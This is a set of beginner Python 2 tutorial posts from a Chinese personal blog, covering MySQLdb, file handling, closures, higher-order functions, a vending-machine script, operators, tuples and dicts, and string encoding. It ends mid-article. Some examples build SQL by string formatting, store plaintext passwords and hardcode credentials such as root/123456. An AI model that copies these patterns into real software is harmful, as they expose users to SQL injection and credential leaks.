安装MySQLdbpython要操作MySQL数据库需要用到MySQLdb模块，所以需要先安装这个模块。 我的电脑是win7 64位系统，所以可以直接在网上下载MySQLdb的安装程序，运行即可。 保证MySQLdb模块的安装路径在Python的安装目录下Lib/site-packages就可以 MySQLdb 下载地址： 32位：http://download.csdn.NET/detail/seven_zhao/6607621 64位：http://download.csdn.Net/detail/seven_zhao/6607625 Python操作MySQL数据库直接上带注释代码： 1234567891011121314151617181920212223242526#coding=utf-8import MySQLdbdef sql_operation(): #打开数据库连接 db = MySQLdb.connect(host='localhost',user='root',passwd='123456',db='test') #使用cursor()方法获取操作游标 cursor = db.cursor() #SQL语句：更新user表中Vimiix的password值为888888 sql = \"update user set password='%s' where name='Vimiix'\"%('888888',) try: #执行SQL语句 cursor.execute(sql) #提交到数据库执行 db.commit() except: print('Update Error!') #发生错误回滚 db.rollback() finally: #关闭数据库 db.close()if __name__ == \"__main__\": sql_operation() 通过python解释器执行上面的代码以后，回到数据库查看user表中的内容，此时表中Vimiix的password已经被修改为‘888888’了。 补充一些常用的方法：cursor用来执行命令的方法:callproc(self, procname, args):用来执行存储过程,接收的参数为存储过程名和参数列表,返回值为受影响的行数 execute(self, query, args):执行单条sql语句,接收的参数为sql语句本身和使用的参数列表,返回值为受影响的行数 executemany(self, query, args):执行单挑sql语句,但是重复执行参数列表里的参数,返回值为受影响的行数 nextset(self):移动到下一个结果集 cursor用来接收返回值的方法:fetchall(self):接收全部的返回结果行. fetchmany(self, size=None):接收size条返回结果行.如果size的值大于返回的结果行的数量,则会返回cursor.arraysize条数据. fetchone(self):返回一条结果行. scroll(self, value, mode=’relative’):移动指针到某一行.如果mode=’relative’,则表示从当前所在行移动value条,如果 mode=’absolute’,则表示从结果集的第一行移动value条.","categories":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/tags/Python/"},{"name":"source code","slug":"source-code","permalink":"http://blog.vimiix.com/tags/source-code/"},{"name":"MySQL","slug":"MySQL","permalink":"http://blog.vimiix.com/tags/MySQL/"},{"name":"MySQLdb","slug":"MySQLdb","permalink":"http://blog.vimiix.com/tags/MySQLdb/"}]},{"title":"Python-文件操作","slug":"Python-File-operation","date":"2017-04-13T07:50:34.000Z","updated":"2017-04-14T02:19:05.115Z","comments":true,"path":"2017/04/13/Python-File-operation.html","link":"","permalink":"http://blog.vimiix.com/2017/04/13/Python-File-operation.html","excerpt":"打开文件在Pyhton中，使用open()函数打开文件，并返回文件对象，拿到这个文件对象，就可以读取或修改这个文件。open()是一个python内建函数，可以直接调用。","text":"打开文件在Pyhton中，使用open()函数打开文件，并返回文件对象，拿到这个文件对象，就可以读取或修改这个文件。open()是一个python内建函数，可以直接调用。 12345678#open()函数在python2.7的介绍Help on built-in function open in module __builtin__:open(...) open(name[, mode[, buffering]]) -&gt; file object Open a file using the file() type, returns a file object. This is the preferred way to open a file. See file.__doc__ for further information. 上面的介绍是在Python2.7中的介绍，python3中新增了很多参数，暂不需要了解。目前只需要关注前两个参数。 第一个参数name：是传入的文件名，如果只是文件名，不带路径的话，Python会在当前文件夹中去寻找该文件并打开。 第二个参数mode：指定文件打开的模式，默认为’r’ 文件的打开模式 打开模式 对应操作 ‘r’ 只读方式打开文件，文件的指针将会放在文件的开头（默认） ‘w’ 只写方式打开文件，如果该文件已存在则将其覆盖，如果该文件不存在，创建新文件 ‘a’ 追加方式打开文件。如果该文件已存在，文件指针将会放在文件的结尾，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件并写入 ‘r+’ 打开一个文件用于读写,文件指针将会放在文件的开头 ‘w+’ 打开一个文件用于读写,如果该文件已存在则将其覆盖,如果该文件不存在，创建新文件 ‘a+’ 打开一个文件用于读写,如果该文件已存在，文件指针将会放在文件的结尾，文件打开时会是追加模式，如果该文件不存在，创建新文件用于读写 ‘b’ 以二进制模式打开文件 示例： 12f=open('test.txt','w')#以只写方式打开文件test.txtf.close() #关闭文件 1、执行open语句后没有报错，就说明文件被成功的打开了。 2、调用close()方法关闭文件。文件使用完毕后必须关闭，因为文件对象会占用操作系统的资源，并且操作系统同一时间能打开的文件数量也是有限的 文件对象的方法 常用的几个文件对象方法 文件对象方法 对应操作 close() 关闭文件 read([size]) 从文件中读取size个字符，没有给定size时，读取文件所有字符，并返回一个字符串 readline() 读取一行，遇到’\\n’停止 readlines（） 一次读取所有内容，并按行返回list write(str) 将字符串str写入文件 writelines(seq) 向文件写入字符串序列seq，seq应该是一个返回字符串的可迭代对象 seek(offset[, whence]) 在文件中移动文件指针，从whence(0:文件起始位置，1:当前位置，2:文件末尾)偏移offset个字节 读文件操作优化（本段摘自廖雪峰教程-文件读写）由于文件读写时都有可能产生IOError，一旦出错，后面的f.close()就不会调用。 所以，为了保证无论是否出错都能正确地关闭文件，我们可以使用try … finally来实现： 123456try: f = open('/path/to/file', 'r') print f.read()finally: if f: f.close() 但是每次都这么写实在太繁琐，所以，Python引入了with语句来自动帮我们调用close()方法： 12with open('/path/to/file', 'r') as f: print f.read() 这和前面的try … finally是一样的，但是代码更佳简洁，并且不必调用f.close()方法。 调用read()会一次性读取文件的全部内容，如果文件有10G，内存就爆了，所以，要保险起见，可以反复调用read(size)方法，每次最多读取size个字节的内容。另外，调用readline()可以每次读取一行内容，调用readlines()一次读取所有内容并按行返回list。因此，要根据需要决定怎么调用。 如果文件很小，read()一次性读取最方便；如果不能确定文件大小，反复调用read(size)比较保险；如果是配置文件，调用readlines()最方便： 12for line in f.readlines(): print(line.strip()) # 把末尾的'\\n'删掉 文件的定位 seek(offset[, whence])当以不同的方式打开文件的时候，文件指针存在的位置是不同的，比如以’w’方式打开文件，文件指针是在文件起始位置，如果以’a’方式打开，文件指针是在文件末尾的。 通过seek(offset[, whence])方法，就可以控制文件指针的位置，定位在我们需要的地方。 参数offset表示从文件中移动offset个操作标记（文件指针），正往结束方向移动，负往开始方向移动。whence，就以whence设定的起始位为准，0代表从头开始，1代表当前位置，2代表文件最末尾位置。 实例： 1234567891011121314151617181920212223#coding=utf-8# 打开一个foo.txt文件f = open(&quot;foo.txt&quot;, &quot;r+&quot;)print &quot;Name of the file: &quot;, f.name # 假设文件中包含下面5行内容# This is 1st line# This is 2nd line# This is 3rd line# This is 4th line# This is 5th line line = f.readline()print &quot;Read Line: %s&quot; % (line) # 将文件指针移回起始位置f.seek(0, 0)line = f.readline()print &quot;Read Line: %s&quot; % (line) # 关闭文件f.close() 执行结果： 1234567================== RESTART: C:/Users/vimiix/Desktop/test.py ==================Name of the file: foo.txtRead Line: This is 1st lineRead Line: This is 1st line&gt;&gt;&gt;","categories":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/tags/Python/"},{"name":"file","slug":"file","permalink":"http://blog.vimiix.com/tags/file/"},{"name":"open","slug":"open","permalink":"http://blog.vimiix.com/tags/open/"},{"name":"close","slug":"close","permalink":"http://blog.vimiix.com/tags/close/"}]},{"title":"Python-关于Python中闭包的一些理解","slug":"Python-About-closure","date":"2017-04-09T09:07:34.000Z","updated":"2017-04-09T10:05:46.335Z","comments":true,"path":"2017/04/09/Python-About-closure.html","link":"","permalink":"http://blog.vimiix.com/2017/04/09/Python-About-closure.html","excerpt":"看不懂的定义：闭包是由函数及其相关的引用环境组合而成的实体(即：闭包=函数+引用环境)。","text":"看不懂的定义：闭包是由函数及其相关的引用环境组合而成的实体(即：闭包=函数+引用环境)。 既然是看不懂的定义，真看不懂上面定义的话就忽略吧。 在python中，函数可以作为另一个函数的参数或返回值，可以赋给一个变量。函数可以嵌套定义，即在一个函数内部可以定义另一个函数，有了嵌套函数这种结构，便会产生闭包问题。 好理解一点的定义：如果在一个内部函数里，对在外部作用域（但不是在全局作用域）的变量进行引用，那么内部函数就被认为是闭包(closure) 举个栗子： 1234def outer(x): def inner(y): return x + y return inner 结合代码分析定义： 如果在一个内部函数里 — inner()就是内部函数。 对在外部作用域（但不是在全局作用域）的变量进行引用 — x就是被引用的变量，x在外部作用域，但不在全局作用域。 那么内部函数就被认为是闭包 —- inner就是一个闭包。 关于闭包很难理解的一个问题，我尝试用图形化思维来理解先看一个简单的循环 12for i in range(3): print i 在程序里面经常会出现这类的循环语句，python的一个现象是，当循环结束以后，循环体中的临时变量i不会销毁，而是继续存在于执行环境中。还有一个python的现象是，python的函数只有在执行时，才会去找函数体里的变量的值。 这段话特别需要记住两点： 当循环结束时，循环体中的临时变量i不会销毁 python的函数只有在执行时，才会去找函数体里的变量的值 记住上面两点后，下面看经典的难理解的栗子： 123456789def foo(): func_list = [] for i in range(3): def inner(): return i*i func_list.append(inner) return func_listf = foo() 在这个例子中，每次循环都创建一个新的函数，并且将创建的三个函数对象都添加到func_list这个列表中 f = foo()这里调用foo()，f中就保存了一个列表对象，这个列表中保存了3个函数对象。 不妨打印一下看看 f 中三个元素的值： 1234&gt;&gt;&gt; print f[0],'\\n',f[1],'\\n',f[2]&lt;function inner at 0x000000000263BAC8&gt; &lt;function inner at 0x0000000002E664A8&gt; &lt;function inner at 0x0000000002E66518&gt; 从打印信息可以看出，f 中存放了3个函数名相同，但内存地址不同，的函数对象。 此时调用一下三个函数 123456&gt;&gt;&gt; f[0]()4&gt;&gt;&gt; f[1]()4&gt;&gt;&gt; f[2]()4 可能有些人认为这段代码的执行结果应该是0,1,4.但是实际的结果是4,4,4。这是因为当把函数对象加入func_list列表里时，python还没有给i赋值，只有当执行时，再去找i的值是什么，这时在第一个for循环结束以后，i的值是2，所以以上代码的执行结果是4,4,4. 不好理解的话，画个流程图(点击图片查看大图)： 这里也可以直观的理解文章开始提到的闭包的定义公式（闭包=函数+引用环境） 结果全部都是 4，原因就在于返回的函数引用了变量i，但它并非立刻执行。等到3个函数被调用时，它们所引用的变量i已经变成了2，因此最终结果为4。 返回闭包时牢记的一点就是：返回函数不要引用任何循环变量，或者后续会发生变化的变量。 如果要正确的输出引用循环变量后的值，只需要将每次循环变量锁定到闭包中，具体实现如下： 123456789def foo(): func_list = [] for i in range(3): def inner( x = i): print x*x func_list.append(inner) return func_listf = foo() 这样的话，打印调用每个闭包后的结果为 0 , 1, 4 123456&gt;&gt;&gt; f[0]()0&gt;&gt;&gt; f[1]()1&gt;&gt;&gt; f[2]()4","categories":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/categories/Python/"}],"tags":[{"name":"closure","slug":"closure","permalink":"http://blog.vimiix.com/tags/closure/"},{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/tags/Python/"}]},{"title":"Python-高阶函数习题练习","slug":"Python-Practice-by-using-higher-order-functions","date":"2017-04-08T07:50:34.000Z","updated":"2017-04-09T09:41:42.926Z","comments":true,"path":"2017/04/08/Python-Practice-by-using-higher-order-functions.html","link":"","permalink":"http://blog.vimiix.com/2017/04/08/Python-Practice-by-using-higher-order-functions.html","excerpt":"本文是针对map()，reduce()和filter()三个高阶函数的程序练习。","text":"本文是针对map()，reduce()和filter()三个高阶函数的程序练习。 习题来自：廖雪峰的python2.7教程 - map/reduce map()概念map()函数接收两个参数，一个是函数，一个是序列，map将传入的函数依次作用到序列的每个元素，并把结果作为新的列表返回。##### 题目&gt; 利用map()函数，把用户输入的不规范的英文名字，变为首字母大写，其他小写的规范名字。&gt; 例如输入：[‘adam’, ‘LISA’, ‘barT’]，输出：[‘Adam’, ‘Lisa’, ‘Bart’] 123456&gt;&gt;&gt; def test(name_list): print(map(lambda name: name[0].upper()+name[1:].lower(), name_list)) &gt;&gt;&gt; test(['adam','LISA','barT'])['Adam', 'Lisa', 'Bart']&gt;&gt;&gt; reduce()概念reduce()把一个函数作用在一个序列[x1, x2, x3…]上，这个函数必须接收两个参数，reduce把结果继续和序列的下一个元素做累积计算 题目 Python提供的sum()函数可以接受一个list并求和，请编写一个prod()函数，可以接受一个list并利用reduce()求积 12345&gt;&gt;&gt; def prod(num_list): print reduce(lambda a,b : a*b , num_list)&gt;&gt;&gt; prod([1,2,3,4])24 filter概念filter()接收一个函数和一个序列，filter()把传入的函数依次作用于每个元素，然后根据返回值是True还是False决定保留还是丢弃该元素 题目 请尝试用filter()删除1~100的素数 概念补充： 素数，又称质数（prime number），有无限个。素数定义为在大于1的自然数中，除了1和它本身以外不再有其他因数的数称为质数 12345678910111213141516171819#coding=utf-8#判断是不是素数，不是返回True，是返回Falsedef not_prime(num): if(num &lt; 2): return True judge = 2 while(judge &lt; num): if num%judge == 0: return True judge += 1 return False#将一个数字列表中所有的素数过滤删除掉def prime_number(num_list): print filter(not_prime,num_list)#删除1~100以内的素数prime_number(range(100)) 123运行结果：==================== RESTART: E:\\Python\\practices\\test.py ====================[0, 1, 4, 6, 8, 9, 10, 12, 14, 15, 16, 18, 20, 21, 22, 24, 25, 26, 27, 28, 30, 32, 33, 34, 35, 36, 38, 39, 40, 42, 44, 45, 46, 48, 49, 50, 51, 52, 54, 55, 56, 57, 58, 60, 62, 63, 64, 65, 66, 68, 69, 70, 72, 74, 75, 76, 77, 78, 80, 81, 82, 84, 85, 86, 87, 88, 90, 91, 92, 93, 94, 95, 96, 98, 99]","categories":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/tags/Python/"},{"name":"map","slug":"map","permalink":"http://blog.vimiix.com/tags/map/"},{"name":"reduce","slug":"reduce","permalink":"http://blog.vimiix.com/tags/reduce/"},{"name":"filter","slug":"filter","permalink":"http://blog.vimiix.com/tags/filter/"}]},{"title":"自助购物机交易源码","slug":"Python-Self-service-shopping-machine","date":"2017-04-05T10:57:34.000Z","updated":"2017-04-09T09:42:43.084Z","comments":true,"path":"2017/04/05/Python-Self-service-shopping-machine.html","link":"","permalink":"http://blog.vimiix.com/2017/04/05/Python-Self-service-shopping-machine.html","excerpt":"本文是一篇纯源码，功能上实现了自助购物机的基本交易过程。","text":"本文是一篇纯源码，功能上实现了自助购物机的基本交易过程。 (由于没有去深研究实际生产环境中自助购物机的逻辑，所以在逻辑上不排除有考虑不周的地方，如果有不完善的地方，请在评论里指出，互相学习。)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#coding=utf-8#Author:Vimiix#Time:2017-04-05#Lisence:Apache#流程分析：# 1、顾客投币，投币结束# 2、遍历商品，展示商品信息# 3、顾客购买饮料，账户结算# 4、任意时刻按q退出print('Welcome!')g_money = 0g_drinks_list = [ ('Coffee',5), ('Coco',2.5), ('Milk',3), ('Water',1) ]#遍历商品，打印商品列表def show_drink_list(): print('*********Drink List*********') print('Index\\tDrink\\tPrice') print('----------------------------') for index,drink in enumerate(g_drinks_list): print index,'\\t',drink[0],'\\t',drink[1] print('****************************')#退款退出def end_shop(): global g_money if g_money == 0: print('Your balance is 0 yuan.\\nByebye') exit() else: print('Return your balance:%d yuan\\nByebye'%g_money) exit()#顾客投币，投币结束以后进入选商品阶段，按q退出def recharge(): global g_money while True: start_money = raw_input('Please input your money(Press \"q\" to exit):') i_money = 0 if start_money == 'q': end_shop() elif start_money.isdigit() and int(start_money) &gt; 0: i_money = int(start_money) g_money += i_money print('You just input %d yuan.Your acount totaly has %d yuan'%(i_money,g_money)) if (raw_input('Do you want to continue inputing?(y/n)：') == 'y'): continue else: print('Your acount totaly has %d yuan.'%g_money) break else: print(\"Sorry,can't recogonize what your input.Try again.\") continue#顾客挑选商品，并显示余额def pick_drink(): global g_money global g_drinks_list while True: customer_choose = raw_input('Input the INDEX of which you want(Press \"q\" to exit):') if customer_choose == 'q': end_shop() else: i_customer_choose = int(customer_choose) if( 0 &lt;= i_customer_choose and i_customer_choose &lt; len(g_drinks_list)): if g_money &lt; g_drinks_list[i_customer_choose][1]: is_recharge = raw_input(\"Your balance is not enough.Do you want to recharge?(y/n):\") if is_recharge == 'y': recharge() else: end_shop() else: g_money -= g_drinks_list[i_customer_choose][1] print('Your chooes is %s ,which costs %.1f yuan.Your balance is %.1f yuan.'\\ %(g_drinks_list[i_customer_choose][0],g_drinks_list[i_customer_choose][1],g_money)) else: print(\"Sorry,can't find it.\")if __name__ == '__main__': recharge() show_drink_list() pick_drink()","categories":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/tags/Python/"},{"name":"source code","slug":"source-code","permalink":"http://blog.vimiix.com/tags/source-code/"}]},{"title":"Python-运算符和流程控制","slug":"Python-operators-and-flow-control","date":"2017-04-01T06:34:20.000Z","updated":"2017-04-09T09:42:27.602Z","comments":true,"path":"2017/04/01/Python-operators-and-flow-control.html","link":"","permalink":"http://blog.vimiix.com/2017/04/01/Python-operators-and-flow-control.html","excerpt":"随手笔记，本篇介绍了python中的各种运算符以及2种流程控制语句。","text":"随手笔记，本篇介绍了python中的各种运算符以及2种流程控制语句。 Python中的运算符算术运算符 运算符 描述 + 加 - 减 * 乘 / 除-Py2中9/2输出4,Py3中9/2输出4.5 % 取余（或者叫取模），返回除法的余数 ** 幂-x**y，x的y次幂 // 取整（地板除）-返回商的整数部分，注意负数的取整，向左取整 比较（关系）运算符，运算结果为布尔值 运算符 描述 == 等于-比较对象是否相等 != 不等于 &gt; 大于 &lt; 小于 &gt;= 大于等于 &lt;= 小于等于 赋值运算符 运算符 描述 = 赋值 += a+=b 等效于 a=a+b -= a-=b 等效于 a=a-b *= a=b 等效于 a=ab /= a/=b 等效于 a=a/b %= a%=b 等效于 a=a%b &#42;&#42;= a&#42;&#42;=b 等效于 a=a&#42;&#42;b //= a//=b 等效于 a=a//b 逻辑运算符 运算符 描述 and 逻辑与（同真为真，输出后值，有假即假，输出第一个假值） or 逻辑或（同假为假，输出前值，有真即真，输出第一个真值） not 逻辑非，取反 位运算符 运算符 描述 &amp; 按位与 说明：参与预算的两个值，转换为二进制，如果两个相应位都为1，则该位结果为1，否则为0 栗子：计算 60 &amp; 13 十进制 二进制 十进制结果 60 111100 13 001101 001100 12 运算符 描述 &#124; 按位或 说明：转换为二进制，只要对应的两个位有一个1，则该位结果为1，否则为0 栗子：计算 60 | 13 十进制 二进制 十进制结果 60 111100 13 001101 111101 61 运算符 描述 ^ 按位异或：位相异结果为1 ~ 按位取反 &lt;&lt; 按位左移 &gt;&gt; 按位右移 成员运算符 运算符 描述 in 如果在in后面的对象中找的到in前面的对象返回True,否则返回False not in 找不到该成员返回True，否则返回False 身份运算符 运算符 描述 is is是判断两个标识符是不是引用自同一个对象（理解：是否标记在同一块内存地址） is not 和is相反 python内存管理机制，对于创建变量的时候，是否重新malloc内存的临界点为 -5~256 看下面的栗子：12345678910111213141516&gt;&gt;&gt; a=256&gt;&gt;&gt; b=256&gt;&gt;&gt; a is bTrue&gt;&gt;&gt; a=257&gt;&gt;&gt; b=257&gt;&gt;&gt; a is bFalse&gt;&gt;&gt; a=-5&gt;&gt;&gt; b=-5&gt;&gt;&gt; a is bTrue&gt;&gt;&gt; a = -6&gt;&gt;&gt; b= -6&gt;&gt;&gt; a is bFalse 流程控制理解if判断语句：什么条件下干什么事 for,while循环语句:在什么条件下，一直做某事 if流程语句语法：1234if 条件语句： 执行代码1else: 执行代码2 条件语句：必须是一个可以用bool值判断的 流程图： 用户登录实例：123456789#coding=utf-8username = 'admin' #设置默认用户名password = '123' #设置默认密码user_input = raw_input('Please input your name:') #提示用户输入用户名passwd_input = raw_input('Please input your password:') #提示用户输入密码if user_input == username and passwd_input ==password: #验证用户名和密码是否和默认值相同 print 'welcome %s login.'%user_inputelse: print 'your name or password is wrong!' 改进：现在需要实现访客输入‘guest’后不需要输入密码，直接就可以登录进去；正常输入用户名的情况下还需要输入密码才能输入 12345678910111213#coding=utf-8username = 'admin' #设置默认用户名password = '123' #设置默认密码guest_name = 'guest'user_input = raw_input('Please input your name:') #提示用户输入用户名if user_input == guest_name: print 'welcome %s login.'%guest_nameelif user_input == username: passwd_input = raw_input('Please input your password:') #提示用户输入密码 if passwd_input ==password: #验证用户名和密码是否和默认值相同 print 'welcome %s login.'%user_inputelse: print 'your name or password is wrong!' 运行结果： while循环语法：12while 判断条件： 循环语句 实例1：计算1到100的和1234567#coding=utf-8i = 1sum = 0while i&lt;=100: sum += i i+=1print sum 实例2：打印九九乘法表（while实现）123456789101112#coding=utf-8i = 1j = 1while i &lt; 10: while j &lt;= i: if( j == i): print i,'x',j,'=',i*j else: print i,'x',j,'=',i*j,' ', j += 1 i += 1 j = 1 运行结果：","categories":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/tags/Python/"},{"name":"flow control","slug":"flow-control","permalink":"http://blog.vimiix.com/tags/flow-control/"},{"name":"operators","slug":"operators","permalink":"http://blog.vimiix.com/tags/operators/"}]},{"title":"Python-对于元祖和字典的认识","slug":"Python-Introduction-of-tuple-and-dict","date":"2017-03-31T07:00:06.000Z","updated":"2017-04-09T09:42:17.591Z","comments":true,"path":"2017/03/31/Python-Introduction-of-tuple-and-dict.html","link":"","permalink":"http://blog.vimiix.com/2017/03/31/Python-Introduction-of-tuple-and-dict.html","excerpt":"本篇是一篇随手笔记，记录了对于Python的数据类型中元祖（Tuple）和字典（Dict）的一些认识，以及部分内置方法的介绍。","text":"本篇是一篇随手笔记，记录了对于Python的数据类型中元祖（Tuple）和字典（Dict）的一些认识，以及部分内置方法的介绍。 元祖 Tuple特点：元祖内的数据不可变一个元素的定义：T = （1，）123&gt;&gt;&gt; T=(1,)&gt;&gt;&gt; type(T)&lt;type 'tuple'&gt; 特殊的元祖：”可变”的元祖1234&gt;&gt;&gt; T=(1,2,3,[1,2,3])&gt;&gt;&gt; T[3][2] = 'vimiix'&gt;&gt;&gt; T(1, 2, 3, [1, 2, 'vimiix']) 看上去元祖发生了变化，但真正变化的是[1，2，3]这个列表内的元素发生了变化，但是这个列表在T这个元祖中的内存地址是没有改变的。 结论：实际是元祖的元素包含了可变的元素，但是元祖中元素的内存地址没有变，所以所谓的元祖不可变是指元素指向的内存地址是不变 字典 Dict特点：1、字典是Python中唯一的映射类型2、字典的键（KEY）必须是不可变的对象—&gt;因为字典在计算机中是通过Hash算法存储的，Hash的特点是由KEY来计算存储的，如果KEY可变，将会导致数据混乱。123&gt;&gt;&gt; D = &#123;1:3,'vimiix':88&#125;&gt;&gt;&gt; type(D)&lt;type 'dict'&gt; 123456&gt;&gt;&gt; D=&#123;[1,2,3]:100&#125;Traceback (most recent call last): File \"&lt;pyshell#15&gt;\", line 1, in &lt;module&gt; D=&#123;[1,2,3]:100&#125;TypeError: unhashable type: 'list' (这里提示list是不能被Hash计算的数据类型，因为list是可变的数据类型)&gt;&gt;&gt; 由此错误可以看出，字典的键只能使用不可变的对象（元祖是可以的），但是对于字典的值没有此要求键值对用冒号‘：’分割，每个对之间用逗号‘，’分开，所有这些用花括号‘{}’包含起来字典中的键值对是没有顺序的，故不可以用索引访问，只可以通过键取得所对应的值 拓展：如果定义的过程中，出现相同的键，最后存储的时候回保留最后的一个键值对）123&gt;&gt;&gt; D= &#123;1:2,1:3&#125;&gt;&gt;&gt; D&#123;1: 3&#125; 创建与访问第一种创建方式：直接通过花括号包含键值对来创建 第二种创建方式：利用内置函数dict()来创建，注意！dict（）括号内只能有一个参数，要把所有的键值对括起来 （1）12345678&gt;&gt;&gt; D =dict((1,2),(3,4),(5,6))Traceback (most recent call last): File \"&lt;pyshell#20&gt;\", line 1, in &lt;module&gt; D =dict((1,2),(3,4),(5,6))TypeError: dict expected at most 1 arguments, got 3&gt;&gt;&gt; D =dict(((1,2),(3,4),(5,6)))&gt;&gt;&gt; D&#123;1: 2, 3: 4, 5: 6&#125; （2）还可以指定关键字参数 123&gt;&gt;&gt; D=dict(vimiix = 'VIMIIX')&gt;&gt;&gt; D&#123;'vimiix': 'VIMIIX'&#125; 这里的小写‘vimiix’不可以加单引号，加了会报错！ （3）dict的内置方法 .fromkeys 有两个参数 1234&gt;&gt;&gt; D = dict.fromkeys((1,'vimiix'),('common','value'))&gt;&gt;&gt; D&#123;1: ('common', 'value'), 'vimiix': ('common', 'value')&#125;&gt;&gt;&gt; 实际的生产过程中，都是使用字典生成式来创建，根据现有的数据来生成对应的数据，有数据才有意义。 字典生成式栗子： 12345&gt;&gt;&gt; L1 = [1,2,3]&gt;&gt;&gt; L2 = ['a','v','vimiix']&gt;&gt;&gt; D=&#123;a:b for a in L1 for b in L2&#125;&gt;&gt;&gt; D&#123;1: 'vimiix', 2: 'vimiix', 3: 'vimiix'&#125; [???]此处只是一个生成式的栗子，但并不是理想答案，待学习如何生成一一对应的键值对字典的内置方法：get():获取键所对应的值，如果未找到返回None，找到返回对应的值 pop(key):弹出key对应的值，默认最后一个 popitem():随机返回并删除字典中的一对键和值（项）。为什么是随机删除呢？因为字典是无序的，没有所谓的“最后一项”或是其它顺序。在工作时如果遇到需要逐一删除项的工作，用popitem()方法效率很高。 update():更新或者新增一个键值对（有则改之无则加勉） 123&gt;&gt;&gt; D.update(&#123;'newitem':'update'&#125;)&gt;&gt;&gt; D&#123;'newitem': 'update', 1: 'vimiix', 2: 'vimiix', 3: 'vimiix'&#125;","categories":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/tags/Python/"},{"name":"tuple","slug":"tuple","permalink":"http://blog.vimiix.com/tags/tuple/"},{"name":"dict","slug":"dict","permalink":"http://blog.vimiix.com/tags/dict/"}]},{"title":"Python-py2中字符与字节之间的编解码[转载]","slug":"Python-py2中字符与字节之间的编解码","date":"2017-03-28T05:56:18.000Z","updated":"2017-05-25T17:06:53.884Z","comments":true,"path":"2017/03/28/Python-py2中字符与字节之间的编解码.html","link":"","permalink":"http://blog.vimiix.com/2017/03/28/Python-py2中字符与字节之间的编解码.html","excerpt":"据说，每个做 Python 开发的都被字符编码的问题搞晕过，最常见的错误就是UnicodeEncodeError、UnicodeDecodeError，你好像知道怎么解决，遗憾的是，错误又出现在其它地方，问题总是重蹈覆辙，str 到 unicode 之间的转换用哪 decode 还是 encode 方法还特不好记，老是混淆，问题究竟出在哪里？","text":"据说，每个做 Python 开发的都被字符编码的问题搞晕过，最常见的错误就是UnicodeEncodeError、UnicodeDecodeError，你好像知道怎么解决，遗憾的是，错误又出现在其它地方，问题总是重蹈覆辙，str 到 unicode 之间的转换用哪 decode 还是 encode 方法还特不好记，老是混淆，问题究竟出在哪里？ 为了弄清楚这个问题，我决定从 python 字符串的构成以及字符编码的细节上进行深入浅出的分析 题图：unsplash.com声明：本文转自公众号Python之禅字节与字符计算机存储的一切数据，文本字符、图片、视频、音频、软件都是由一串01的字节序列构成的，一个字节等于8个比特位。 而字符就是一个符号，比如一个汉字、一个英文字母、一个数字、一个标点都可以称为一个字符。 字节方便存储和网络传输，而字符用于显示，方便阅读。字符 “p” 保存到硬盘就是一串二进制数据 01110000，占用一个字节的长度 编码与解码我们用编辑器打开的文本，看到的一个个字符，最终保存在磁盘的时候都是以二进制字节序列形式存起来的。那么从字符到字节的转换过程就叫做编码（encode），反过来叫做解码（decode），两者是一个可逆的过程。编码是为了存储传输，解码是为了方便显示阅读。 例如字符 “p” 保存到硬盘是一串二进制 01110000 ，占用一个字节的长度。字符 “禅” 有可能是以 “11100111 10100110 10000101” 占用3个字节的长度存储，为什么说是有可能呢？这个放到后面再说。 Python 编码为什么那么蛋疼？当然，这不能怪开发者。 这是因为 Python2 使用 ASCII 字符编码作为默认编码方式，而 ASCII 不能处理中文，那么为什么不用 UTf-8 呢？因为 Guido 老爹为 Python 编写第一行代码是在1989年的冬天，1991年2月正式开源发布了第一个版本，而 Unicode 是1991年10月发布的，也就是说 Python 这门语言创立的时候 UTF-8 还没诞生，这是其一。 Python 把字符串的类型还搞成两种，unicode 和 str ，以至于把开发者都弄糊涂了，这是其二。python3 就彻底把 字符串重新改造了，只保留一种类型，这是后话，以后再说。 str与unicodePython2 把字符串分为 unicode 和 str 两种类型。本质上 str 是一串二进制字节序列，下面的示例代码可以看出 str 类型的 “禅” 打印出来是十六进制的 \\xec\\xf8 ，对应的二进制字节序列就是 ‘11101100 11111000’。 12345&gt;&gt;&gt; s = '禅'&gt;&gt;&gt; s'\\xec\\xf8'&gt;&gt;&gt; type(s)&lt;type 'str'&gt; 而 unicode 类型的 u”禅” 对应的 unicode 符号是 u’\\u7985’ 12345&gt;&gt;&gt; u = u\"禅\"&gt;&gt;&gt; uu'\\u7985'&gt;&gt;&gt; type(u)&lt;type 'unicode'&gt; 我们要把 unicode 符号保存到文件或者传输到网络就需要经过编码处理转换成 str 类型，于是 python 提供了 encode 方法，从 unicode 转换到 str，反之亦然。 encode12345&gt;&gt;&gt; u = u\"禅\"&gt;&gt;&gt; uu'\\u7985'&gt;&gt;&gt; u.encode(\"utf-8\")'\\xe7\\xa6\\x85' decode1234&gt;&gt;&gt; s = \"禅\"&gt;&gt;&gt; s.decode(\"utf-8\")u'\\u7985'&gt;&gt;&gt; 不少初学者怎么也记不住 str 与 unicode 之间的转换用 encode 还是 decode，如果你记住了 str 本质上其实是一串二进制数据，而 unicode 是字符（符号），编码（encode）就是把字符（符号）转换为 二进制数据的过程，因此 unicode 到 str 的转换要用 encode 方法，反过来就是用 decode 方法。 encoding always takes a Unicode string and returns a bytes sequence, and decoding always takes a bytes sequence and returns a Unicode string”. 清楚了 str 与 unicode 之间的转换关系之后，我们来看看什么时候会出现 UnicodeEncodeError、UnicodeDecodeError 错误。 ##UnicodeEncodeError UnicodeEncodeError 发生在 unicode 字符串转换成 str 